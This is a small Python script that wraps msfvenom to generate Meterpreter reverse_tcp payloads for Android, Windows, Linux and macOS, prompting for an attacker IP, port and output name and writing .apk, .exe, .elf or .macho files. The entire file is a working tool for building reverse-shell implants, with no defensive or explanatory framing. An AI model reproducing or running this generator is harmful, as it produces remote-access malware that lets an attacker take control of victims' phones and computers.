import subprocess
def payloadgenerater():
    ip = input("Enter the Ip Address : ")
    port = input("Enter the Port Number : ")
    fn = input("Enter the Payload Name : ")
    print("1) Android Payload ")
    print("2) Windows Payload ")
    print("3) Linux Payload ")
    print("4) Mac Payload ")
    num = input("Enter the Option : ")
    match num:
        case "1":
            subprocess.run(["msfvenom","-p","android/meterpreter/reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o",fn + ".apk"])
        case "2":
            subprocess.run(["msfvenom","-p","windows/meterpreter/reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o",fn + ".exe"])
        case "3":
            subprocess.run(["msfvenom","-p","linux/x86/meterpreter/reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o",fn + ".elf"])
        case "4":
            subprocess.run(["msfvenom","-p","osx/x86/meterpreter/reverse_tcp","LHOST=" + ip,"LPORT=" + port,"-o",fn + ".macho"])
        case _:
            print("Invaild Option")